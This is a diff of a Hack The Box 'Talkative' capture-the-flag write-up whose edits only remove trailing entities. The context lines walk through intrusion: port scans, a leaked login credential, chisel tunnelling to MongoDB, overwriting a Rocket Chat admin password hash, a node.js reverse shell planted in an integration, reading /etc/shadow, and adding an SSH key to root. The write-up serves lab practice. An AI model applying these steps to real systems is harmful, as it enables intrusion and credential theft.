@@ -20,7 +20,7 @@ PORT     STATE SERVICE
 8082/tcp open     blackice-alerts
 ```
 
-Lots of HTTP ports it seems. We can add `talkative.htb` to our `/etc/hosts` file to view these sites. Also, SSH seems to be blocked, so we probably need to access from within a shell.&#x20;
+Lots of HTTP ports it seems. We can add `talkative.htb` to our `/etc/hosts` file to view these sites. Also, SSH seems to be blocked, so we probably need to access from within a shell.
 
 ### Talkative
 
@@ -38,11 +38,11 @@ saul@talkative.htb
 janit@talkative.htb
 ```
 
-Other than that, there's nothing much here.&#x20;
+Other than that, there's nothing much here.
 
 ### Rocket Chat
 
-On port 3000, there was a Rocket Chat instance.&#x20;
+On port 3000, there was a Rocket Chat instance.
 
 <figure><img src="../../../.gitbook/assets/image (204).png" alt=""><figcaption></figcaption></figure>
 
@@ -60,7 +60,7 @@ This is a statistical software that is used for data analytics. The more interes
 
 <figure><img src="../../../.gitbook/assets/image (1036).png" alt=""><figcaption></figcaption></figure>
 
-We now have a very simple RCE on the machine. We can get a reverse shell using a simple `bash` script.&#x20;
+We now have a very simple RCE on the machine. We can get a reverse shell using a simple `bash` script.
 
 <figure><img src="../../../.gitbook/assets/image (3819).png" alt=""><figcaption></figcaption></figure>
 
@@ -148,11 +148,11 @@ $ cat xdata.json | jq
 }
 ```
 
-Now that we have some credentials, we need to find the Bolt login page. Normally, this is at the `/bolt` directory. We can find this login page at `talkative.htb/bolt`.&#x20;
+Now that we have some credentials, we need to find the Bolt login page. Normally, this is at the `/bolt` directory. We can find this login page at `talkative.htb/bolt`.
 
 <figure><img src="../../../.gitbook/assets/image (2472).png" alt=""><figcaption></figcaption></figure>
 
-We can login with `saul@talkative.htb:jeO09ufhWD<s`.&#x20;
+We can login with `saul@talkative.htb:jeO09ufhWD<s`.
 
 <figure><img src="../../../.gitbook/assets/image (1516).png" alt=""><figcaption></figcaption></figure>
 
@@ -176,7 +176,7 @@ Then, we need to head to Maintenance > Clear Cache, and reload the main page aft
 
 <figure><img src="../../../.gitbook/assets/image (1979).png" alt=""><figcaption></figcaption></figure>
 
-### Docker Escape -> User&#x20;
+### Docker Escape -> User
 
 We had access to yet another Docker container. However, there was really nothing here that I could find or exploit. I tried to `ssh` to `172.17.0.1` as `saul`, and it worked surprisingly.
 
@@ -269,7 +269,7 @@ PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
 rtt min/avg/max/mdev = 0.106/0.106/0.106/0.000 ms
 ```
 
-So this machine exists. We can download the `nmap` binary onto the machine and scan this host.&#x20;
+So this machine exists. We can download the `nmap` binary onto the machine and scan this host.
 
 ```
 saul@talkative:~$ ./nmap_binary -p- --min-rate 10000 172.17.0.2
@@ -286,7 +286,7 @@ PORT      STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds
 ```
 
-Port 27017 for MongoDB is open, and we can forward this using `chisel`.&#x20;
+Port 27017 for MongoDB is open, and we can forward this using `chisel`.
 
 ```bash
 # on kali
@@ -295,7 +295,7 @@ chisel server -p 5555 --reverse
 ./chisel client 10.10.14.13:5555 R:27017:172.17.0.2:27017
 ```
 
-Then, we can enumerate port 27017 for ourselves. Since it is running on our localhost, we can use `mongo` to interact with it.&#x20;
+Then, we can enumerate port 27017 for ourselves. Since it is running on our localhost, we can use `mongo` to interact with it.
 
 ### Mongo Enum
 
@@ -376,7 +376,7 @@ usersSessions
 view_livechat_queue_status
 ```
 
-We can view the users present on the Rocket Chat instance.&#x20;
+We can view the users present on the Rocket Chat instance.
 
 {% code overflow="wrap" %}
 ```
@@ -386,7 +386,7 @@ rs0:PRIMARY> db.users.find()
 ```
 {% endcode %}
 
-We can sort of make out how there's an `admin` user that has a hashed Bcrypt password. What we can do is replace this with a hash of our own choosing and then login as the admin of Rocket Chat.&#x20;
+We can sort of make out how there's an `admin` user that has a hashed Bcrypt password. What we can do is replace this with a hash of our own choosing and then login as the admin of Rocket Chat.
 
 {% code overflow="wrap" %}
 ```
@@ -423,7 +423,7 @@ Reading the documentation for Rocket Chat, it appears that this runs Javascript 
 
 {% embed url="https://docs.rocket.chat/use-rocket.chat/workspace-administration/integrations" %}
 
-We can grab a quick node.js reverse shell and slap it in there.&#x20;
+We can grab a quick node.js reverse shell and slap it in there.
 
 ```javascript
 (function(){
@@ -452,16 +452,16 @@ Afterwards, we would catch a reverse shell on our listener port:
 
 ### Docker Vulnerabilities
 
-This Docker was almost completely empty. We didn't have any tools to run or anything really, and it was a bit difficult to progress from here. Since there was no applications on the machine and we are root, the vulnerability should have to do with Docker somehow.&#x20;
+This Docker was almost completely empty. We didn't have any tools to run or anything really, and it was a bit difficult to progress from here. Since there was no applications on the machine and we are root, the vulnerability should have to do with Docker somehow.
 
 I enumerated a few things:
 
 * Kernel Exploits
-* Determined if there commands I could run by checjking the binaries present on the machine, and saw that we could run `node`, `perl` and `bash`. Nothing else.&#x20;
+* Determined if there commands I could run by checjking the binaries present on the machine, and saw that we could run `node`, `perl` and `bash`. Nothing else.
 * Checked the file system for the 100th time to make sure I didn't miss an obvious file
 * Checked the user capabilities
 
-The last one proved to be interesting. Since we didn't have `capsh`, we could do it by reading `/proc/self/status`.&#x20;
+The last one proved to be interesting. Since we didn't have `capsh`, we could do it by reading `/proc/self/status`.
 
 ```
 root@c150397ccd63:/home# cat /proc/self/status
@@ -587,7 +587,7 @@ lxd:!:18849::::::
 saul:$6$19rUyMaBLt7.CDGj$ik84VX1CUhhuiMHxq8hSMjKTDMxHt.ldQC15vFyupafquVyonyyb3/S6MO59tnJHP9vI5GMvbE9T4TFeeeKyg1:19058:0:99999:7:::
 ```
 
-Works! Now we could just read the root flag and be done with, but I wanted to get a proper shell.&#x20;
+Works! Now we could just read the root flag and be done with, but I wanted to get a proper shell.
 
 ### Getting Shell
 
@@ -605,7 +605,7 @@ root@c150397ccd63:/# ls /root
 root.txt
 ```
 
-With this, we just need to echo in a public key and we can SSH from `saul`.&#x20;
+With this, we just need to echo in a public key and we can SSH from `saul`.
 
 ```bash
 echo 'PUBLIC KEY' >> /root/.ssh/authorized_keys
